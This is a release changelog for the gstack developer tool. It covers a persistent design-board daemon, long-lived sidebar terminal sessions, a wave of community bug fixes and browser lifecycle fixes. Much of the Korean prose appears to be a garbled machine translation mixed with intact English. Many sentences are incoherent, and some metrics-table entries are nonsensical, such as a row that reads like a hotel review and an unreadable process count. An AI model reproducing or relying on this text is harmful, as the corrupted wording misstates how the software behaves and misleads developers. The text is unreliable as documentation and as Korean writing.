- `TemplateContext`는 `--explain-level` 구조 깃발에서 실을 꿰는 선택적인 `explainLevel: 'default' | 'terse'` 분야를 얻습니다.

**Fixed**
- 카탈로그 설명 no 더 긴 접힌 YAML 필드 (no newline과 `description: ... (gstack)allowed-tools:`를 생성한 공간 구현; `\n`를 대체로 승인하여 조정).

**관련 기사**
- 새로운 기술은 `test/skill-coverage-matrix.ts`의 항목이 필요합니다. `gate[]`의 `test/skill-coverage-floor.test.ts`를 참조하는 최소의 항목은 CI의 문 `test/skill-coverage-matrix.test.ts`의 문은 누락된 항목에 빠릅니다.
- 기술 가족을위한 새로운 필수품은 `test/helpers/parity-harness.ts`에서 `PARITY_INVARIANTS`로 이동합니다. invariants를 추가하는 것은 첨가제입니다. 제거하면 deliberate 범위 결정입니다.
- `scripts/jargon-list.json`는 대변광입니다. 거기에 용어를 추가합니다. gen-skill-docs는 다음의 레겐에서 자동으로 선택합니다.
- `test/fixtures/parity-baseline-v1.44.1.json`는 잠긴 v1→v2 참고입니다. 수정하지 마십시오; `bun run scripts/capture-baseline.ts --tag <name>`를 통해 나중에 새로운 스냅샷을 캡처하십시오.

## [1.45.0.0] - 2026-05-25

## **디자인 보드는 지금 24 시간, 10 분 살. 하나 daemon 호스트 모든 보드, 한 탭은 하루 종일 살아.**

`$D compare --serve`를 실행하고 호출 당 신선한 과정 대신 `.gstack/design.json`의 지속적 디자인 daemon를 얻습니다. 오후에 세 개의 디자인 세션을 열고 동일한 포트에 `/boards/<id>/`의 모든 땅을 엽니다. 브라우저 탭을 열면 나중에 1 시간 동안 처음 작동했습니다. 이들 타임 아웃은 10 분 (이전의 처리 서버)에서 24 시간의 inactivity (daemon의 일생)에 갔다. URL는 daemon가 밖으로 idles까지 접근할 수 있도록 `http://127.0.0.1:N/`의 디자인 역사를 통해 다시 스크롤할 수 있습니다.

기술 invocations (`/design-shotgun`, `/design-consultation`, `/plan-design-review`, `/design-review`, `/office-hours`)는 `$D compare --serve`를 정확하게 동일한 방법을 부르는 것을 계속합니다. CLI 모양은 변하지 않습니다. 다른 것은 이진이 이제 자가 문서에 daemon 형태에, 달리는 daemon에 붙인다, 거기인 경우에 신선한 것을, 그리고 인쇄합니다 `BOARD_PUBLISHED: http://127.0.0.1:N/boards/<id>/`를 인쇄하는 경우에 이렇게 daemon 형태를 인쇄할 수 있습니다. 레거시 `--no-daemon` 플래그는 테스트 및 디버깅을 위한 이전의 단일 프로세스 동작을 보존합니다.

### 중요 한 숫자

출처: `bun test design/test/` 및 `git diff origin/main...HEAD --stat`.

| Metric                                  | 의 전        | 후지후         | Δ              |
|-----------------------------------------|---------------|---------------|----------------|
| 보드 당 Idle timeout                  | 10 분    | 24시간      | 144×           |
| N 보드의 서버 프로세스           | ₢ 킹             | 1             | N ×             |
| 브라우저 탭을 열고               | 1개의 널 | 1 총     | N ×             |
| repo의 설계 테스트                    | 16            | 77            | +61            |
| 덮는 시험 경로 (failure modes)      | not enumerated| 38 / 100%     | 전체 범위  |
| 후기 – 호텔 포르토 – 이탈리아  | 2             | 19            | Codex에서 17× |

| 제품정보                  | 새로운 라인 | 시험 선 |
|----------------------------|-----------|------------|
| design/src/daemon.ts       | ~580      | 34 테스트   |
| design/src/daemon-client.ts| ~340      | 23 테스트   |
| design/src/daemon-state.ts | ~180      | (클라이언트 + daemon테스트를 통해; 직접 stale-lock 저장소 적용) |
| HTTP를 통해 브라우저 라운드 스트립| (예) | 4개의 시험    |

압축: 61 new tests cover every endpoint, lifecycle path, LRU eviction, real idle-shutdown behavior (spawn-based, daemon process observed exiting after `IDLE_MS`), the bare-GET-doesn't-reset-idle invariant (poll loop in background, daemon still idles out), the idle-with-active-boards extension path with `MAX_EXTENSIONS` hard ceiling, concurrent-CLIs lock race (two parallel `ensureDaemon` calls converge on one daemon), identity-verified spawn, version mismatch with and without active boards, PID-reuse safety, path traversal rejection, malformed-body negatives on every POST, and cross-board feedback isolation. The plan-review pass caught 2 architectural issues in-house; an outside Codex pass caught 17 more, all absorbed into the implementation before any code was written; the /ship review army caught 1 backwards-compat break in skill resolvers (fixed) + 5 deferred test gaps (filled). The version-mismatch path now refuses to silently kill a daemon with active boards (it prints a warning and exits 1), so upgrading gstack mid-design-session doesn't drop your in-memory board history.

### 이 빌더를 의미하는 것

`/design-shotgun` 월요일 아침, 3개의 둥근 변형을 통해 일하고, 점심을 위해 도보, 돌아옵니다, click 제출. 널은 아직도 거기 있습니다. 오후에 다른 특징을 위해 두번째 `/design-shotgun`를 열고, `/boards/<another-id>/`, no 항구 churn에 새로운 URL를, 당신의 아침 널 아직도 작동합니다. 디자인 탐험의 전체적인 하루의 가치는 daemon에 뿌리는 죽음에 대한 걱정을 멈추는 daemon에 묶는 역사로 축적됩니다.

### 항목화 된 변경

#### 추가
- **Persistent design daemon** (`design/src/daemon.ts`). Bun HTTP server on `127.0.0.1` hosting many boards under `/boards/<id>/`. Per-board state machine (`serving | regenerating | done`), LRU cap of 50 boards (evicts `done` first, returns 503 when 50 non-done coexist), 24h idle timeout with 1h extensions up to a 28h ceiling when boards are still active, per-board async mutex serializing feedback POST vs reload POST. Index page at `/` lists recent boards newest first.
- **`$D daemon status`**와 **`$D daemon stop [--force]`**. 정지 sub-command는 `--force`가 활성화된 경우, 그래서 캐주얼 스톱은 불이 켜지지 않는 역사.
- **daemon 고객** (`design/src/daemon-client.ts`). `ensureDaemon()` handles spawn-or-attach with file-lock-protected spawn (re-reads state inside the lock to close the two-CLIs-race window) and identity-verified SIGTERM (reads `/proc/PID/cmdline` on Linux, `ps -p PID -o command=` on macOS, only signals if `gstack-design-daemon` is in the cmdline). PID-reuse safety: if the state file points at a PID belonging to an unrelated process, no signal is sent and a fresh daemon spawns. Version-mismatch refusal: CLI가 새 gstack 버전에서 CLI가 이전 daemon에서 열리는 동안 도착하면 CLI는 사용자 행동 경고를 인쇄하고 침묵적으로 재시작하고 잃는 역사 대신 1번 출구를 인쇄합니다.
- **daemon 상태 유틸리티** (`design/src/daemon-state.ts`). 원자 상태 파일 쓰기 (`<tmp>` + `renameSync`), `fs.openSync('wx')` 독점적인 자물쇠, 크로스 플랫폼 cmdline 독자, 버전은 `DESIGN_DAEMON_VERSION` env → `design/dist/.version`를 통해서 뒤에 떨어지는 것을, 건축 시간 → 근원 나무 `VERSION` → `"unknown"`에서 구워집니다.
- **실제 스파게드에 대한 반투명 테스트 daemon** (`design/test/feedback-roundtrip-daemon.test.ts`). HTTP fetch 드라이브는 submit → 재생산 → 재부하 → round-2 submit, `feedback.json` 토지를 `boardId`와 `publishedAt` 증강 분야로 `sourceDir`를 가진 데몬 파생된 `sourceDir`를 몹니다.

#### 변경
- **Board JS는 상대 URL을 사용합니다** 대신 주사 `__GSTACK_SERVER_URL` 글로벌. HTML는 `/` (legacy `--no-daemon`)와 `/boards/<id>/` (daemon)에서 작동한다. `location.protocol` 특징 탐지는 `file://` DOM- 단지 내리는 경로 일을 지킵니다.
- **베어 `GET /boards/<id>` 301 반환** 에 `/boards/<id>/`. 탈래는 널 JS에 있는 상대 URL 해결책을 위해 짐 방위입니다; 그것 없이, `fetch('./api/feedback')`는 틀린 범위에 해결할 것입니다.
- **Reload guard는 디렉토리 경로를 거부**. `design/src/serve.ts:200-212` 이전에 `resolvedReload === allowedDir`를 통해 `readFileSync`를 `EISDIR`로 추락했습니다. 이제 `statSync(resolvedReload).isFile()`를 대신 클리어 400으로 요구합니다.
- **피드백 파일은 `boardId`와 `publishedAt`를 나릅니다** 소 에이전트는 `feedback.json` / `feedback-pending.json`를 멀티 보드 세계에서 투표 할 수 있는지 확인 할 수 있습니다.
- **`sourceDir`는 `realpath(html)` 서버 측에서 파생됩니다**, 출판 POST 몸에서 결코 신뢰하지 않습니다.
- **기술 결의자 및 템플릿** (`scripts/resolvers/design.ts`, `design-shotgun/SKILL.md`, `design-consultation/SKILL.md`, `plan-design-review/SKILL.md`, `office-hours/SKILL.md`) `BOARD_URL:`, stderr, POST에서 `${BOARD_URL}api/reload`로 다시 로드하는 레거시 포트 전용 `/api/reload`로 업데이트되었습니다. 레거시 `SERVE_STARTED: port=N html=...` 선은 백사형을 위해 아직도 방출했습니다.

#### 고정
- **daemon로 이진 self-execs를 컴파일** 를 통해 `--daemon-mode` 플래그, 그래서 daemon 라이프사이클은 `design/dist/design` (원목에 대하여 `bun run` 를 설치하지 않는 경우에) 사용자를 위해 작동합니다.
- **버전 보기**는 클라이언트와 daemon 사이에서 일관되게 합니다. 둘 다 `readVersionString()`를 통해서 갈, 그래서 버전 mismatch refusal 경로는 항상 `"unknown"`를 읽고 일치하는 대신 컴파일된 이진에 작동하고.

#### 기여자
- **Test 인프라 분할**: `design/test/daemon.test.ts` (빠른 이탈을 위해 수출된 `fetchHandler`, ~70ms)에 대하여 30의 처리 시험; `design/test/daemon-discovery.test.ts` (17개의 진짜 천막 시험, ~8s) 수명주기 + 자물쇠 + ID 보증을 위해. `design/test/daemon-tests-fixtures.ts`에 있는 공유 헬스터.
- **플랜 일람**: this branch ran `/plan-eng-review` twice. Round 1 caught 2 architecture findings. An outside-voice Codex pass after round 1 found 17 more (URL contract self-contradiction, false test-green claim, lock semantics, identity verification, version-mismatch silent data loss, several others). Round 2 absorbed all 17 before implementation started. The full review trail is preserved in the plan file's `## GSTACK REVIEW REPORT` section.

## [1.44.1.0] - 2026-05-24

## **Nine 커뮤니티는 한 번에 배송을 수정합니다.** 사무실 시간 회의 카운터는 다시 작동, iOS QA 터널는 macOS 26.x, Windows 뇌 동기화 정지 떨어지는 artifacts를, 찾아서 서버는 당신이 바인드 실패가 항구 충돌 또는 sandbox 구획이 있다는 것을 알려줍니다.

The fix wave pattern runs its second pass after v1.43.2.0's 15-PR Daegu wave. Nine contributor PRs land in eleven commits plus a merge from new main. Each cherry-pick routes through `git cherry-pick` per-commit so contributor authorship survives in `git log --author`, with `Co-Authored-By` trailers for GitHub's contribution UI. Wave-meta files (VERSION, CHANGELOG, version-only `package.json` bumps) stripped per cherry-pick so the wave owns its own bump cleanly.

삼기는 실제 실패 모드 중 단색을 잡았다. 18 PR의 초기 범위는 외부 목소리로 Codex 리뷰를 통해 갔다. Codex는 18의 9이 이미 v1.43.2.0 또는 sibling 커밋을 통해 배송되었음을 파쇄했다. 현재 주요 (`bin/gstack-gbrain-sync.ts:404` 이미 `{sources:[...]}`, `browser-manager.ts:30` 이미 `isCustomChromium`, `server.ts:209` 이미 `ownsTerminalAgent`)를 포장했다. Recompute는 18에서 9까지의 파도를 트리밍하고 9 개의 빈 체리 피크를 저장하고 9 개의 미묘한 "랜드"로 다른 노선을 통해 이미 합병 한 기여자에게 가까운 의견을 요약했습니다.

### 중요 한 숫자

출처: `git log origin/main..HEAD` 및 `gh pr view --json closingIssuesReferences` 파 당 PR.

| Metric                                       | 의 값      |
|----------------------------------------------|------------|
| 커뮤니티 PR                         | 9          |
| 의약금               | 9          |
| merge에 의해 자동 닫히는 문제점                  | 4          |
| 파일 변경                                | 26         |
| 관련 상품                                  | 1,651      |
| 제거 된 라인                                | 114        |
| 파 커밋 (merge 제외)               | 11         |
| 이미 shipped PRs 잡았 + politely 닫히는 | 9          |
| ran (모든 PASS)         | 6          |

### 기여자에 대한 의미

`git log --author=<your-handle>`의 이름을 가진 commit로 당신의 고침 땅. PR가 다수 투입이 있는 경우에, 각 땅은 따로따로 이렇게 날짜와 트레일러 살아있었습니다. 당신의 고침이 v1.43.2.0에 있는 다른 노선을 통해 발송하는 무언가와 동일하, 당신은 이름에 의해 당신을 신용하는 CHANGELOG 선에 근접한 의견이 얻습니다. 중복을 붙잡는 recompute 단계는 지금 각 미래 고침 파의 부분입니다.

### 항목화 된 변경

**Added**
- `/investigate` 동결 후크는 독립 시장 설치에 해결합니다. 하드 코딩 된 `../freeze/` 보기에 충돌 대신 번들 및 독립 동결 빈 경로 모두 뒤를 덮습니다. #1647를 닫습니다. PR #1648를 통해 @Gujiassh에 의해 공헌하십시오.
- `gstack-next-version --version-path` 플래그 플러스 `.gstack/version-path` 구성: monorepo VERSION 레이아웃은 지금 작동합니다. PR #1627를 통해 @cfeddersen에 의해 공헌하십시오.

**Fixed**
- `/office-hours` SESSION_COUNT는 v1.0 이후 0에 찔렀습니다. 작가는 `builder-profile.jsonl`, 독자가 새로운 `developer-profile.json`에서 읽었습니다. 독자 동원은 첫 번째 호출에 기존의 유산 데이터를 자동 마이그레이션합니다. 기존 사용자는 세션 역사를 유지합니다. 33 회 회귀 테스트와 정적 인 변수를 핑하는 것은 no-legacy-writes 컨트랙트를 핑합니다. #1671, #1677. @powry에 의해 #1676 #1676.
- `gstack-timeline-read --branch "feature/o'hare"` no는 단 하나 인용된 branch 이름에 더 긴 틈. 자료로 통과된 여과기는 포탄 명령으로, interpolated. #1634를 닫습니다. PR #1635를 통해 @jbetala7에 의해 공헌하십시오.
- `browse` 서버 로컬 호스트 바인드: `EADDRINUSE` (실제 포트 충돌) 샌드박스 `EPERM` (Codex/Conductor 쉘 샌드박스 차단 바인드 syscall). 한 사람이 일어난 사용자를 알려줍니다. PR #1664를 통해 @spacegeologist에 의해 기여했습니다.
- `v1.40.0.0` jq-less 기계에 이동: 모든 수선이 불조건적으로 쓰기 대신에, 성공할 때까지 defers 행해지는 말러. 사전 설정 경로를 명중한 사용자를 위한 다음 업그레이드에 마이그레이션을 다시 실행합니다. 8 케이스 회귀 테스트. #1581를 닫습니다. PR #1589를 통해 @stedfn에 의해 공헌하십시오.
- 세 Windows 뇌 동기화 버그: backslash 대 앞으로 슬래시 거즈, bash-shebang 서브 처리에 실패 `cmd.exe`, CRLF stdout 끊기 `git add`. `windows-free-tests.yml` 에 PR #1672 를 통해 @daveowenatl에 의해.
- `gstack-diff-scope`는 `bun.lock` (Bun v1.2+ 원본 lockfile)를 `bun.lockb`와 함께 검출합니다. 이 없이, eval-select는 Bun 1.2+에 lockfile 변화를 건너 뛰었습니다. PR #1649를 통해 @hiSandog에 의해 공헌했습니다.
- macOS 26.x: `coredevice.local` 해상도는 `xcrun devicectl` → `dns.lookup` → `dns.resolve6`를 통해 떨어지는 터널는 mDNSResponder가 우회될 때 조차도 옵니다. 터널 지탱은 이렇게 오래 실행 QA 회의를 살아남기 위하여 추가했습니다. PR #1673를 통해 @sternryan에 의해 공헌하십시오.

## [1.44.0.0] - 2026-05-23

## **Sidebar Claude Code는 이제 하루를 살아남습니다.** WebSocket는 scrollback intact를 가진 네트워크 blips의 맞은편에, 투명한 재 부착을 지키고, 실제로 새로운 것을 스파게 되기 전에 오래된 claude를 죽이는 재시작 단추. 외부 감독관은 이렇게 찾아낸 서버 자체는 충돌하고 당신을 noticing 없이 재기할 수 있습니다.

사이드바의 임베디드 `claude` PTY는 잠시 후 연결하고 나머지 버튼은 실행 프로세스를 죽이지 않고 클라이언트 측 WebSocket를 닫았습니다. 브라우저를 닫은 좀비 claude 프로세스는 몇 분 동안 살아남습니다. None 그 이상의.

v1.43 경로에 5개의 합성 타임아웃: PTY 세션 token TTL는 no 새로 고침으로 30 분, no WebSocket 지분 (NAT idle timeouts of 30-60s 침묵으로 연결), 서버의 30 분 idle timeout은 활성 PTY 세션에 대한 계정이 없었다면, 사이드바는 15 초 후에 냉각된 WS를 시작으로, no의 모든 부분이 WS에 있는 no를 시작하였다.

### 중요 한 숫자

출처: 13 bisect 이 branch (`git log v1.43.3.0..HEAD --oneline`), 12개의 새로운 시험 파일, 83개의 새로운 단위 층 정체되는 지프 + 행동 시험; 가득 차있는 `bun test` 스위트 그린. 살아있는 re-attach 활동은 `GSTACK_PTY_DETACH_WINDOW_MS=1000`에 대하여 달합니다 그래서 60s detach 창은 CI 시간의 <2s에서 verifies.

| Surface | 의 전 | 후지후 |
|---|---|---|
| 사이드바 요들 5 분, 그 다음 키 입력 | 재연결 스피너, ~3s ~ 첫 바이트 | Immediate 출력 - WS 유지 보수가 필요 |
| Wifi blip 중간 소유 | "Session end"- click 나머지, 스크롤백을 잃어버린 | 8s, scrollback intact 내의 침묵하는 re-attach, 계속 typing |
| claude 중간 task와 Restart를 클릭하십시오 | 오래된 claude는 비동기적으로 사망했습니다; 새로운 스파셋을 가진 레이스 창; 사용자는 새로운 프롬프트를 볼 열쇠를 타야 합니다 | 서버는 이전 PTY 비동기적으로, 1개의 거래에 있는 분 새로운 임대료, 신속한 렌더링의 앞에 eager `{type:"start"}` 부츠 claude를 궤란합니다 |
| 닫기 sidebar / 브라우저 종료 | 60s (detach 창)을위한 좀비 claude 라이딩 | `pagehide` sendBeacon `/pty-dispose`는 즉시 청소합니다 |
| 터미널 에이전트 다이스 (OOM, 신호) | Sidebar는 수동 재부하까지 부서지는 연결을 보여줍니다 | PID-liveness check (no split-brain) respawns 에이전트을 자동적으로 가진 60s 워치독; 3-in-60s 충돌 반복 감시 |
| 서버 자체 충돌 | Headed 브라우저 또는 판, 수동 `$B connect` 재 실행 | Opt-in `$B connect --supervise`는 CLI 부착, 1s/2s/4s/8s/30s 백오프, 5-in-5min 감시를 가진 respawn 서버 지킵니다 |
| 두 `$B connect` 같은 호스트에 세션 | 세션에서 나머지 세션 B의 터미널 에이전트을 죽이는 `pkill -f` regex 경기 | Identity-based `process.kill(pid)` per-boot 에이전트 레코드에 대하여. 정적 그립 테스트는 CI if `pkill -f terminal-agent` reappears where 소스에서 |
| PTY token 로그/ DevTools에 누설 | Bearer token 세션 식별자로 더블 (codex 외부 청구서가 붙여 넣기) | 안정적인 비 스탑 `sessionId` 단축 `attachToken`로 분리; 수명주기는 세션 liveness를 소유합니다. |

### 너를 위한 이 뜻

사이드바를 한 번 엽니 다. 그것을 사용하십시오. 노트북을 닫으십시오. 내일을 깨. 열쇠를 입력합니다. 그것은 단지 작동합니다. 전체 "단말은 작동을 멈추지 않고, 사이드바를 다시로드하십시오"는 v1.40s를 통해 구축되었습니다. - 당신은 그것을 더 필요로하지 않습니다.

### 항목화 된 변경

#### 추가

- **긴 수명 PTY 연결 (`browse/src/terminal-agent.ts`, `extension/sidepanel-terminal.js`)** — 25s WebSocket는 양측에서 ping/pong 주기를 지키. NAT 요들 하락과 Chrome MV3 패널 유출 주기 no 더 긴 침묵하게 소켓을 죽이십시오. `GSTACK_PTY_KEEPALIVE_INTERVAL_MS`를 통해 Env overridable.
- **세션 임대 + 첨부토큰 모델 (`browse/src/pty-session-lease.ts`)** - 짧은 라이브 비밀 `attachToken`에서 분리되는 안정되어 있는 비 반초 `sessionId`. 임대 창 내의 재 부착물은 신선한 `attachToken`를 동일한 `sessionId`에 경계를 맑게 합니다; 세션 정체성은 로그아웃, 곰버 압착 체재를 체재합니다.
- **재조절에 재조절 (`browse/src/terminal-agent.ts`)** — 1 MB ESC-boundary scan and alt-screen tracking (`CSI ?1049h/l`)과 세션 당 프레임 기반 링 버퍼. 재 부착에 클라이언트는 xterm에 `\x1bc` (`\x1bc`)를, 서버 prepends DECSTR 연약한 리셋 + 선택적인 alt 스크린 리-enter + 반지 버퍼를 씁니다. 리플레이는 청소하게 중앙 도구 외침 조차 만듭니다. Env-overable `GSTACK_PTY_RING_BUFFER_BYTES`를 통해.
- **repo크로 60s detach 창 (`browse/src/terminal-agent.ts`)** — WS 4001 (intentional), 4404 (no-claude), 또는 1000 (clean Exit)가 60s를 위해 살아 있는 PTY를 유지합니다. 동일한 sessionId에 일치하는 새로운 WS 향상은 동일한 `claude` 과정을 재개합니다. `GSTACK_PTY_DETACH_WINDOW_MS`를 통해 Env-overridable.
- **작동 나머지 단추 (`browse/src/server.ts`, `extension/sidepanel-terminal.js`)** — `POST /pty-restart`는 1개의 거래입니다: 오래된 세션 범위를 옮기려면, 오래된 임대를, 민트 신선한 sessionId + 임대 + 부착물 토큰을, 4단계 돌려보내십시오. 클라이언트는 eager spawn를 위한 새로운 WS에 `{type:"start"}`를 즉각 보냅니다 — no 중요한 치기 필요.
- **반바 닫힘에 폭발 (`extension/sidepanel.js`)** — `pagehide` 핸들러는 `navigator.sendBeacon('/pty-dispose', {sessionId, authToken})`를 불이 켜져 있습니다. 브라우저는 / 패널 닫기/ 연장 다시 로드가 세션을 즉시 분배합니다. 서버 경로는 몸 (sendBeacon-compatible — no 주문 헤더)에서 auth token를 받아들입니다.
- **PID-identity 단말 죽이기 (`browse/src/terminal-agent-control.ts`)** — `pkill -f terminal-agent\.ts` regex 눈물 아래로 대체합니다. 에이전트은 `<stateDir>/terminal-agent-pid` (JSON `{pid, gen, startedAt}`)를 부동에 쓰입니다; `cli.ts` 및 `server.ts` 사용 `killAgentByRecord` 대신. 정체되는 윤활 삼각 시험은 CI가 regex 본이 근원에 돌려보내는 경우에 실패합니다.
- **제1 터미널 에이전트 워커그(`browse/src/server.ts`)** - 60s ticker checks record agent PID via `process.kill(pid, 0)`. 공유 `spawnTerminalAgent` 객관을 통해 죽은 PID에 재봉. 3-in-60s 충돌 루프 가드 롤링 창. 느린-but-alive Agent 의도적으로 가을을 통해 (절대 방위). `GSTACK_AGENT_WATCHDOG_TICK_MS`를 통해 Env-overridable.
- **외부 검색 서버 관리자 (`browse/src/cli.ts`)** - `$B connect --supervise` (또는 `BROWSE_SUPERVISE=1`)는 CLI 부착된 CLI, 30s마다, 1s/2s/4s/8s/30s 백오프와 예상치 못한 출구에 respawns를, 지킵니다. SIGINT/SIGTERM는 상시한 서버로 찢어지게 합니다. Opt-in — default `$B connect`는 모든 기존의 콜러를 위해 바꾸지 않습니다.
- **환자 `tryAutoConnect` (`extension/sidepanel-terminal.js`)** - 15s가 무한한 2s 투표로 할당합니다. 15s/60s/5min에서 상태를 종료하면 사용자가 여전히 시도하는 것을 알고 있습니다. 401 (auth invalid)에서만 끈으로 묶어 표현된 나머지 클릭으로 명확하게 합니다.
- **`/internal/healthz` 노선 + `internalHandler<T>` 헬퍼 (`browse/src/terminal-agent.ts`)** — 시계가 사용된 probe (pid/gen/sessions 조사, 접촉 claude 바이너리 보기). 도우미는 4개의 `/internal/*` 노선의 Bearer-auth + X-Browse-Gen 체크 + JSON 1개의 강선으로 덮습니다.

#### 변경

- **`/pty-session` 응답 모양 (`browse/src/server.ts`)** — 이제 `{terminalPort, sessionId, attachToken, leaseExpiresAt}`를 반환합니다. `ptySessionToken` + `expiresAt`는 1개의 작은 방출을 위해 보존된 별명으로.
- **`ServerConfig.ownsTerminalAgent` 눈물** — 이제 4개의 부작용을 실행합니다 (세로 세): `killAgentByRecord`를 통해 ID 근거를 두는, 플러스 `terminal-port`, `terminal-internal-token`를 위한 unlinks를, 그리고 새로운 `terminal-agent-pid`. CLAUDE.md에서 문서화하는.

#### 고정

- **gstack 세션이 `pkill -f terminal-agent\.ts`에 의해 사망** - Pre-v1.44 눈물다운 일치 argv regex; `terminal-agent.ts`가 SIGTERM를 얻은 명령 줄이 있는 어떤 과정든지. v1.41 (`Identity-based terminal-agent kill`) 도중 신청된 TODOS.md P3 품목을 닫습니다.
- **이 branch와 관련된 7개의 사전 노출 시험 실패** — Three env-pollution failures (Bun's `Bun.which('bash')` returning null and `Bun.spawn(['bun', ...])` ENOENT after a sibling test mutated `process.env.PATH`), two stale-marker failures in `server-auth.test.ts` (`'Sidebar agent started'` → `'Terminal agent started'`), `setup-codesign.test.ts` looking for the unwrapped `bun run build` string (now `bun_cmd run build`), and `upgrade-migration-v1.test.ts` reading the developer's real config because it didn't override `HOME`. 좁은 글로벌 `test-setup.ts` (모든 테스트 후 PATH를 저장합니다)과 타겟팅 마커 + env-passing 수정을 통해 고정하십시오.

#### 기여자

- **테스트 프레임 워크 `bunfig.toml` + `test-setup.ts`** — Global afterEach는 `process.env.PATH`만 복원합니다. snapshot/restore는 모듈 부하에서 `process.env.GSTACK_HOME`를 합법적으로 설정한 테스트를 넓히는 목적을 위해 좁은 범위의 `domain-skills-storage.test.ts`)를 사용합니다.
- **12 새로운 테스트 파일, 83 새로운 단위 층 테스트.** 정체되는 지프 삼각대는 짐 방위 의정서 계약을 방어합니다 (닫히는 코드, 임대 생활 주기, watchdog ID 체크, 감독 충돌 반복 감시, 반지 완충기 ESC 경계)는 CI에 있는 WebSocket 주기를 지불하지 않고.
- **Eng review + 외부 음성 (codex)이 지점에서 랜.** 17 결정 구운: 10 in-review Architecture pass (D1-D10), 6 from codex cross-model Tension resolution (T1-T6, 모든 codex의 호평에 채택 - 대부분의 consequential was T1, 분리 세션auth token), 그리고 1 from-PR 범위-up of the External supervisor.

## [1.43.3.0] - 2026-05-21

## **Headed Chromium 외부 감독자가 자동 중단을 중지하여 내장한 HTTP 요들 30 분 후에.** ## **`browse/src/server.ts`의 4개의 단위 수준 수명주기 핸들러는 이제 `activeBrowserManager` 간접을 통해 읽었습니다 그래서 embedders (gbrowser의 phoenix 상감세공)는 죽은 단위 수준 하나 대신에 적당한 `BrowserManager` 예를 도달합니다.**

Codex 계획 검토가 정적 인 eng 검토가 놓인 것을 붙잡을 때 표면이 이중 조밀도벌레: `idleCheckTick`, 부모 과정 watchdog, SIGTERM 핸들러 및 `onDisconnect` 배선은 모든 단위 수준 `BrowserManager`를 직접 읽었습니다. Embedders는 `buildFetchHandler({ browserManager: ... })`로 그들의 자신의 인스턴스를, 그래서 단위 수준 인스턴스가 그것에 불린 `launchHeaded()`를 결코 가지고 있지 않습니다. `connectionMode`는 `'launched'` 영원히 유지하고, 머리 위 형태 초기 회전은 결코 불을, 그리고 후에 30 분의 HTTP idle 서버는 아직도 열려있는 오바레이 창의 밑에 스스로 죽었습니다. onDisconnect 누출 — 창 닫히는 정리는 틀린 예를 통해 달리고 — 이 고침까지 30 분 자동 하수구에 의해 복종되었습니다; 둘 다 함께 배는 단 하나 뿌리 원인을 공유하기 때문에.

수정은 모듈 범위에서 `let activeBrowserManager: BrowserManager`를 도입하여 기존 `let activeShutdown` 패턴과 비대칭합니다. `buildFetchHandler`는 `cfg.browserManager`와 CHAINS `cfg.browserManager.onDisconnect`에서 `activeShutdown`로 변경하여 콜러가 이미 설치되었는지 다시 합니다. 콜러 예외는 로그아웃되지 않았지만 gstack 종료를 차단하지 못합니다. `safeUnlinkQuiet` / `safeKill` in 10. Caller-set onDisconnect 핸들러는 먼저 실행되므로 임베디드를 snapshot 또는 프로세스 종료 전에 로그 할 수 있습니다. gstack의 폐쇄는 `process.exit(code)`를 소유하고 마지막으로 실행합니다.

### 중요 한 숫자

출처: `bun test browse/test/server-factory.test.ts` - 33의 시험, 모든 녹색. 새로운 묘사 구획 `idle timer + onDisconnect dual-instance fix` 핀 5개의 행동 보증 플러스 정체되는 감시.

| Surface | 의 전 | 후지후 |
|---|---|---|
| gbrowser 오버레이 세션, headed, 31 분 HTTP 요들 | 서버 자체 종료; 오버레이 창 orphaned | 서버는 살아있다; idleCheckTick은 cfg-instance을 읽고 일찍 반환 |
| Headless CLI, 31 분 요일 | 자동 폐기 (테스트 2)에 의해 회귀 보호 | 동일한 행동, 회귀 시험 추가 |
| 터널 활성 세션, headless, 31 분 요원 | 자동 정지 건너뛰기 (already 정확한) | 동일; 시험 4 핀 그것은 행동으로 |
| 임베디드 소유 headed 창에 닫히는 | `browserManager.onDisconnect` 죽은 모듈 레벨에 불을 붙입니다. no 정리 | `cfgBrowserManager.onDisconnect` activeShutdown에 체인을 쌓아; 전체 정리 실행 |
| Embedder 사전 설치 onDisconnect 핸들러 | `buildFetchHandler`에 의해 자동적으로 과잉 | 체인: 콜러의 핸들러가 먼저 실행, 그 후 gstack 종료 |
| SIGTERM 에서 headed 모드 (embedder) | stale 모듈 레벨 인스턴스 읽기 (Codex-caught, 원래 계획 놓여) | `activeBrowserManager`를 통해 읽으십시오 |

정적 가드 (테스트 5)는 `activeBrowserManager.getConnectionMode()` 외침 `buildFetchHandler`와 정확히 3에서 카운트를 핀으로 곱합니다. `idleCheckTick`, 부모 watchdog 및 SIGTERM 핸들러. 사용자가 볼 수없는 버그가 반환하기 전에 해당 사이트의 하나에서 모듈 레벨 `browserManager`에 대해 읽는 stale을 다시 입력하는 미래 재원.

### gbrowser의 의미는 무엇입니까

gbrowser's phoenix overlay can hold a headed Chromium window open indefinitely without gstack pulling the rug out at the 30-minute mark. Window-close cleanup reaches the right `BrowserManager` instance, so terminal-agent, profile locks, and state files all get torn down against the cfg-owned chrome rather than the dead module-level one. Embedders that pre-wire `cfg.browserManager.onDisconnect` for their own pre-shutdown work (logging, snapshotting, gbd handoff) now have that handler preserved instead of clobbered. gbrowser는 gstack 이 땅 후에 SHA를 요약합니다; no gbrowser 측 코드 변화는 요구했습니다.

### 항목화 된 변경

#### 고정

- **`browse/src/server.ts`**: 6개의 편집 사이트는 간접을 적용합니다.
  - 1 (라인 ~705) 편집 : 모듈 레벨 `const browserManager`와 함께 `let activeBrowserManager: BrowserManager = browserManager;`를 선언합니다. 모듈 레벨 `browserManager.onDisconnect` default 와이어는 CLI 흐름 전에 안전 그물로 유지됩니다.
  - 2 (라인 ~596) 편집 : idle-check setInterval 콜백을 `idleCheckTick()` 함수로 추출하여 행동 테스트를 직접 구동할 수 있습니다. `activeBrowserManager.getConnectionMode()`를 읽어보십시오.
  - 3 편집 (라인 ~658) : 부모 watchdog은 이제 `activeBrowserManager.getConnectionMode()`을 읽습니다.
  - Edit 4 (inside `buildFetchHandler`, line ~1387): Retargets `activeBrowserManager` at `cfgBrowserManager` and CHAINS the cfg-instance's onDisconnect to `activeShutdown` (preserving any caller-installed handler). Replaces what would have been a bare `cfg.onDisconnect = ...` clobber — caught by Codex against an earlier draft.
  - 5 (no 코드 변경) 편집 : 라인 714의 단위 레벨 `browserManager.onDisconnect`를 배치합니다.
  - 6 (라인 ~1212): SIGTERM 핸들러는 `activeBrowserManager.getConnectionMode()`를 읽습니다. Codex에 의해 잡았습니다. 원래 eng-review 계획은 이 네 번째 라이프 사이클 사이트를 놓았습니다.
